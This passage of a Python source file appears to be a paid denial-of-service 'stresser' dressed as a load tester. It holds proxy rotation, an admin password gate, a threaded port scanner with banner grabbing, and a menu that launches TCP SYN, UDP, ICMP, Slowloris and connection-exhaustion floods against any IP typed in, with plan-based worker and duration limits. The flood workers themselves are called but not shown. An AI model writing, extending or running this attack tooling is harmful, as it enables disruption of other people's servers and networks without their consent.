        print(f"\n  Invalid input")
        time.sleep(1)

async def proxy_settings():
    global proxies_enabled
    clear_screen()
    print(f"{current_color}{BOLD}╔══ PROXY SETTINGS ══╗{RESET}\n")
    print(f"  Proxies: {'Enabled' if proxies_enabled else 'Disabled'}")
    async with proxy_lock:
        count = len(proxy_list)
    print(f"  Proxies loaded: {count}")
    print("\n  Options:")
    print("  [1] Toggle proxies on/off")
    print("  [2] Refresh proxy list now (fetch from web)")
    print("  [3] Clear proxy list")
    print("  [4] Load proxies from file (proxies.txt)")
    print("  [0] Back")
    
    choice = input(f"\n  Select → ").strip()
    if choice == '1':
        proxies_enabled = not proxies_enabled
        print(f"  Proxies now {'enabled' if proxies_enabled else 'disabled'}.")
        if proxies_enabled:
            asyncio.create_task(refresh_proxy_list(force=True))
        time.sleep(1)
    elif choice == '2':
        asyncio.create_task(refresh_proxy_list(force=True))
        print("  Proxy refresh started in background.")
        time.sleep(1)
    elif choice == '3':
        async with proxy_lock:
            proxy_list.clear()
        print("  Proxy list cleared.")
        time.sleep(1)
    elif choice == '4':
        file = input("  Proxy file path (default: proxies.txt) → ").strip() or "proxies.txt"
        load_proxies(file)
        time.sleep(2)
    else:
        return

def admin_login():
    global admin_mode
    clear_screen()
    print(f"{current_color}{BOLD}╔══ ADMIN PANEL ══╗{RESET}\n")
    if admin_mode:
        print("  You are already in admin mode.")
        logout = input("  Logout? (y/n) → ").strip().lower()
        if logout in ['y', 'yes']:
            admin_mode = False
            print("  Logged out.")
        else:
            print("  Staying in admin mode.")
        time.sleep(1)
        return
    pwd = input("  Enter admin password → ").strip()
    if pwd == ADMIN_PASSWORD:
        admin_mode = True
        print(f"\n  {current_color}✓ Admin mode activated!{RESET}")
        print(f"  Workers: {ADMIN_WORKERS} | Duration: {ADMIN_DURATION}s")
        print("  All methods unlocked.")
    else:
        print("\n  ✗ Incorrect password.")
    time.sleep(2)

# ================== PORT SCANNER (Reconnaissance) ==================
def scan_port(target_ip, port, timeout=1):
    """Check if a single TCP port is open."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((target_ip, port))
    sock.close()
    return result == 0

def threaded_port_scan(target_ip, ports, timeout=1, max_threads=100):
    """Scan a list of ports using a thread pool."""
    open_ports = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_port = {executor.submit(scan_port, target_ip, port, timeout): port for port in ports}
        for future in as_completed(future_to_port):
            port = future_to_port[future]
            if future.result():
                open_ports.append(port)
                print(f"  {current_color}[OPEN]{RESET} Port {port}")
    return sorted(open_ports)

def reconnaissance_menu():
    """Display reconnaissance submenu."""
    clear_screen()
    print(f"{current_color}{BOLD}╔══ RECONNAISSANCE ══╗{RESET}\n")
    print("  [1] Quick Port Scan (1-1000)")
    print("  [2] Custom Port Scan")
    print("  [3] Scan with Service Detection")
    print("  [4] Attack Discovered Ports")
    print("  [0] Back")
    print()
    choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()
    
    if choice == '1':
        target = input("  Target IP → ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("  Invalid IP address.")
            input("  Press ENTER...")
            return
        print(f"\n  Scanning ports 1-1000 on {target}...")
        open_ports = threaded_port_scan(target, range(1, 1001))
        print(f"\n  Found {len(open_ports)} open ports: {open_ports}")
        input("  Press ENTER...")
    elif choice == '2':
        target = input("  Target IP → ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("  Invalid IP address.")
            input("  Press ENTER...")
            return
        range_input = input("  Port range (e.g., 1-5000 or 80,443,8080) → ").strip()
        ports = []
        if '-' in range_input:
            start, end = map(int, range_input.split('-'))
            ports = list(range(start, end+1))
        elif ',' in range_input:
            ports = [int(p.strip()) for p in range_input.split(',')]
        else:
            ports = [int(range_input)]
        print(f"\n  Scanning {len(ports)} ports on {target}...")
        open_ports = threaded_port_scan(target, ports)
        print(f"\n  Found {len(open_ports)} open ports: {open_ports}")
        input("  Press ENTER...")
    elif choice == '3':
        # Service detection (simple banner grab)
        target = input("  Target IP → ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("  Invalid IP address.")
            input("  Press ENTER...")
            return
        range_input = input("  Port range (default 1-1000) → ").strip()
        if not range_input:
            ports = range(1, 1001)
        elif '-' in range_input:
            start, end = map(int, range_input.split('-'))
            ports = list(range(start, end+1))
        elif ',' in range_input:
            ports = [int(p.strip()) for p in range_input.split(',')]
        else:
            ports = [int(range_input)]
        print(f"\n  Scanning and grabbing banners on {target}...")
        open_ports = []
        common_services = {80: 'HTTP', 443: 'HTTPS', 22: 'SSH', 21: 'FTP', 25: 'SMTP', 3306: 'MySQL', 5432: 'PostgreSQL'}
        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {executor.submit(scan_port, target, port, 1): port for port in ports}
            for future in as_completed(future_to_port):
                port = future_to_port[future]
                if future.result():
                    open_ports.append(port)
                    banner = common_services.get(port, 'unknown')
                    # Try banner grab for common ports
                    if port in [80, 443, 21, 22, 25, 110, 143, 993, 995]:
                        try:
                            s = socket.socket()
                            s.settimeout(2)
                            s.connect((target, port))
                            if port == 80:
                                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                                banner = s.recv(1024).decode().split('\r\n')[0]
                            elif port == 21:
                                banner = s.recv(1024).decode().strip()
                            elif port == 22:
                                banner = s.recv(1024).decode().strip()
                            s.close()
                        except:
                            pass
                    print(f"  {current_color}[OPEN]{RESET} Port {port} - {banner}")
        print(f"\n  Found {len(open_ports)} open ports.")
        input("  Press ENTER...")
    elif choice == '4':
        # Attack discovered ports (synchronous stats display)
        target = input("  Target IP → ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("  Invalid IP address.")
            input("  Press ENTER...")
            return
        ports_input = input("  Ports to attack (comma-separated) → ").strip()
        if not ports_input:
            return
        ports = [int(p.strip()) for p in ports_input.split(',')]
        # Choose attack method
        print("\n  Available Layer 4 methods:")
        for idx, m in enumerate(LAYER4_METHODS, 1):
            print(f"  {idx}. {m}")
        method_choice = input("  Select method number → ").strip()
        try:
            method = LAYER4_METHODS[int(method_choice)-1]
        except:
            print("  Invalid choice.")
            input("  Press ENTER...")
            return
        # Set up attack parameters
        if admin_mode:
            max_workers = ADMIN_WORKERS
            max_duration = ADMIN_DURATION
            plan_name = "ADMIN"
        else:
            plan_info = PLANS[current_license['plan']]
            max_workers = plan_info['workers']
            max_duration = plan_info['duration']
            plan_name = plan_info['name']
        try:
            workers = int(input(f"\n  Workers (max {max_workers}) → ") or 100)
            workers = min(workers, max_workers)
        except:
            workers = 100
        try:
            duration = int(input(f"  Duration (seconds, max {max_duration}) → ") or 60)
            duration = min(duration, max_duration)
        except:
            duration = 60
        # Reset stats
        stats["start_time"] = time.time()
        stats["requests"] = 0
        stats["errors"] = 0
        stats["latencies"] = []
        stats["status_codes"] = Counter()
        stats["running"] = True
        stats["active_agents"] = []
        stats["connections"] = 0
        stats["ports_hit"] = set()
        
        print(f"\n{current_color}{BOLD}Starting attack on {target} ports {ports}...{RESET}")
        end_time = time.time() + duration
        with ThreadPoolExecutor(max_workers=workers) as executor:
            # Create worker functions for each port
            futures = []
            for i in range(workers):
                port = random.choice(ports)
                if method == 'TCP SYN FLOOD':
                    futures.append(executor.submit(tcp_syn_flood_worker, target, port, i, end_time))
                elif method == 'UDP FLOOD':
                    futures.append(executor.submit(udp_flood_worker, target, port, i, end_time))
                elif method == 'SLOWLORIS':
                    futures.append(executor.submit(slowloris_worker, target, port, i, end_time))
                elif method == 'CONNECTION EXHAUSTION':
                    futures.append(executor.submit(connection_exhaustion_worker, target, port, i, end_time))
                elif method == 'ICMP FLOOD':
                    futures.append(executor.submit(icmp_flood_worker, target, i, end_time))
                elif method == 'PORT SCAN & ATTACK':
                    futures.append(executor.submit(port_scan_worker, target, i, end_time))
            # Stats display (synchronous loop)
            try:
                while stats["running"] and time.time() < end_time:
                    elapsed = time.time() - stats["start_time"]
                    with stats_lock:
                        rps = stats["requests"] / elapsed if elapsed > 0 else 0
                        reqs = stats["requests"]
                        errs = stats["errors"]
                        conns = stats["connections"]
                        ports_hit = len(stats["ports_hit"])
                    # Clear screen or use \r to update in place
                    print(f"\r{current_color}[{elapsed:.1f}s] Packets: {reqs:,} | Errors: {errs:,} | PPS: {rps:.2f} | Conns: {conns} | Ports Hit: {ports_hit}{RESET}", end="", flush=True)
                    time.sleep(1)
                print()  # newline after loop
            except KeyboardInterrupt:
                print(f"\n\nAttack interrupted.")
            finally:
                stats["running"] = False
        elapsed = time.time() - stats["start_time"]
        with stats_lock:
            reqs = stats["requests"]
            errs = stats["errors"]
        print(f"\nAttack finished. Total packets: {reqs}, errors: {errs}, duration: {elapsed:.1f}s")
        input("  Press ENTER...")
    else:
        return

# ================== MAIN ==================
def main():
    # Increase file descriptor limit
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

    while True:
        header()
        choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()

        if choice in ["0", "q", "exit"]:
            print(f"\n{current_color}Session ended.{RESET}\n")
            break
        elif choice == "1":
            asyncio.run(run_load_test())
        elif choice == "2":
            test_config_screen()
        elif choice == "3":
            color_screen()
        elif choice == "4":
            view_test_agents()
        elif choice == "5":
            plan_and_license()
        elif choice == "6":
            change_ascii_menu()
        elif choice == "7":
            clear_screen()
            print(f"\033[2J\033[H")
            time.sleep(0.3)
        elif choice == "8":
            asyncio.run(proxy_settings())
        elif choice == "9":
            admin_login()
        elif choice == "10":
            reconnaissance_menu()
        else:
            print(f"  Invalid selection.")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{current_color}Forced exit.{RESET}")
    finally:
        print(f"{RESET}")
